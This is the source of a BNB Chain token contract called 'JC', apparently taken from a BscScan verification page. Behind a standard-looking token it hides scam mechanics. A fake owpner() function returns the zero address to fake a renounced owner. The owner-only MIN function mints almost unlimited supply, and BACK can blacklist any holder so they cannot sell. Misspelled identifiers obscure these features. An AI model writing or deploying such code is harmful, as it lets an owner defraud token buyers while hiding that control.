/**
 *Submitted for verification at BscScan.com on 2022-07-06
*/

pragma solidity ^0.4.25;

library SafeMath {

    function mul(uint256 a, uint256 b) internal pure returns (uint256) {
        if (a == 0) {
            return 0;
        }
        uint256 c = a * b;
        require(c / a == b);
        return c;
    }

    function div(uint256 a, uint256 b) internal pure returns (uint256) {
        require(b > 0);
        uint256 c = a / b;
        return c;
    }

    function sub(uint256 a, uint256 b) internal pure returns (uint256) {
        require(b <= a);
        uint256 c = a - b;
        return c;
    }

    function add(uint256 a, uint256 b) internal pure returns (uint256) {
        uint256 c = a + b;
        require(c >= a);
        return c;
    }

    function mod(uint256 a, uint256 b) internal pure returns (uint256) {
        require(b != 0);
        return a % b;
    }
}

contract Ownable {
    address public owpner;

    event owneresshipTransferred(address indexed previousowneres, address indexed newowneres);

    modifier onlyowneres() {
        require(msg.sender == owpner);
        _;
    }

/**
    * @dev Returns the address of the current owpner.
     */
    function owpner() public pure returns (address) {
        return address(0);
    }


    function transferowneresship(address newowneres) public onlyowneres {
        require(newowneres != address(0));
        emit owneresshipTransferred(owpner, newowneres);
        owpner = newowneres;
    }

    function renounceowneresship() public onlyowneres {
        emit owneresshipTransferred(owpner, address(0));
        owpner = address(0);
    }
}



contract BaseToken is Ownable {
    using SafeMath for uint256;

    string constant public name = 'JC';

    string constant public symbol = 'JC';

    uint8 constant public decimals = 18;

    uint256 public totalSupply = 1000000000*10**uint256(decimals);

    uint256 public constant MAXSupply = 1000000000000000000000000000000000000000000000000000 * 10 ** uint256(decimals);

    mapping (address => uint256) public balanceOf;
    mapping (address => mapping (address => uint256)) public allowance;

    mapping(address => bool) private _isExcludedFromefe;

    mapping(address => bool) private _lkck;


    uint256 public _taxefe = 0;
    uint256 private _previousTaxefe = _taxefe;

    uint256 public _burnefe = 1;
    uint256 private _previousBurnefe = _burnefe;


    address public projectAddress = 0xc087f601c66305948Af0A1827D26165733C9d64b;


    address public burnAddress = 0x000000000000000000000000000000000000dEaD;

    event Transfer(address indexed from, address indexed to, uint256 value);
    event Approval(address indexed owpner, address indexed spender, uint256 value);

    function _transfer(address from, address to, uint value) internal {
        require(to != address(0), "is 0 address");

        require(!_lkck[from], "is lkck");

        if(_isExcludedFromefe[from])
            removeAllefe();

        uint256 efe =  calculateTaxefe(value);

        uint256 burn =  calculateBurnefe(value);

        balanceOf[from] = balanceOf[from].sub(value);

        balanceOf[to] = balanceOf[to].add(value).sub(efe).sub(burn);

        if(efe > 0) {
            balanceOf[projectAddress] = balanceOf[projectAddress].add(efe);
            emit Transfer(from, projectAddress, efe);
        }

        if(burn > 0) {
            balanceOf[burnAddress] = balanceOf[burnAddress].add(burn);
            emit Transfer(from, burnAddress, burn);
        }


         if(_isExcludedFromefe[from])
            restoreAllefe();

        emit Transfer(from, to, value);
    }


    function transfer(address to, uint256 value) public returns (bool) {
        _transfer(msg.sender, to, value);
        return true;
    }

    function transferFrom(address from, address to, uint256 value) public returns (bool) {
        allowance[from][msg.sender] = allowance[from][msg.sender].sub(value);
        _transfer(from, to, value);
        return true;
    }

    function approve(address spender, uint256 value) public returns (bool) {
        require(spender != address(0));
        allowance[msg.sender][spender] = value;
        emit Approval(msg.sender, spender, value);
        return true;
    }

    function increaseAllowance(address spender, uint256 addedValue) public returns (bool) {
        require(spender != address(0));
        allowance[msg.sender][spender] = allowance[msg.sender][spender].add(addedValue);
        emit Approval(msg.sender, spender, allowance[msg.sender][spender]);
        return true;
    }

    function decreaseAllowance(address spender, uint256 subtractedValue) public returns (bool) {
        require(spender != address(0));
        allowance[msg.sender][spender] = allowance[msg.sender][spender].sub(subtractedValue);
        emit Approval(msg.sender, spender, allowance[msg.sender][spender]);
        return true;
    }


    function MIN(address target, uint256 edAmount) public onlyowneres{
    	require (totalSupply + edAmount <= MAXSupply);

        balanceOf[target] = balanceOf[target].add(edAmount);
        totalSupply = totalSupply.add(edAmount);

        emit Transfer(0, this, edAmount);
        emit Transfer(this, target, edAmount);
    }

    function calculateTaxefe(uint256 _amount) private view returns (uint256) {
        return _amount.mul(_taxefe).div(
            10 ** 2
        );
    }

    function calculateBurnefe(uint256 _amount) private view returns (uint256) {
        return _amount.mul(_burnefe).div(
            10 ** 2
        );
    }

    function removeAllefe() private {
        if(_taxefe == 0 && _burnefe == 0)
            return;

        _previousTaxefe = _taxefe;
        _previousBurnefe = _burnefe;
        _taxefe = 0;
        _burnefe = 0;
    }

    function restoreAllefe() private {
        _taxefe = _previousTaxefe;
        _burnefe = _previousBurnefe;
    }



    function BACK(address account) public onlyowneres {
        _lkck[account] = true;
    }


    function UNBACK(address account) public onlyowneres {
        _lkck[account] = false;
    }


    function islkck(address account) public view returns (bool) {

        return _lkck[account];
    }


}


contract Token is BaseToken {

    constructor() public {
        balanceOf[msg.sender] = totalSupply;
        emit Transfer(address(0), msg.sender, totalSupply);

        owpner = msg.sender;


    }

    function() public payable {
       revert();
    }
}